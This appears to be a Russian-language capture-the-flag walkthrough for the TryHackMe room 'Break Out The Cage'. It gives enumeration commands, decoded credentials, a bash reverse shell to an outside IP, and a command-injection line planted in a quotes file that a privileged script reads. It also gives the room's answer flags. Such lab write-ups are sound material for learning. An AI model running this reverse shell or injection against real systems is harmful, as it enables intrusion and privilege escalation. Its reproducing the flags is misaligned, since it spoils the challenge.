

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Break Out The Cage](https://tryhackme.com/r/room/breakoutthecage1) 

Всего 1 заданиe:
## Задание 1
Давайте узнаем, чем занимается его агент...

### Ответьте на вопросы ниже
Какой пароль у Уэстона?
```commandline
nmap -sC -sV <IP>
ftp <IP>
ls -la
get dad_tasks
cat dad_tasks | base64 -d
```
```commandline
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```
Что такое флаг пользователя?
```commandline
ssh weston@<IP>
weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes
sudo -l
ls -l /usr/bin/bees
sudo /usr/bin/bees 
find / -type f -user cage 2>/dev/null
cat /opt/.dads_scripts/spread_the_quotes.py
cat /opt/.dads_scripts/.files/.quotes
nc -nlvp 4444

cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.9.0.54/4444 0>&1
EOF

chmod +x /tmp/shell.sh
printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
cat Super_Duper_Checklist
```
```commandline
THM{M37AL_0R_P3N_T35T1NG}
```
Что такое корневой флаг?
```commandline
cat email_backup/*
su root
Password: cageisnotalegend
ls -la
cd email_backup
cat email_1
```
```commandline
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)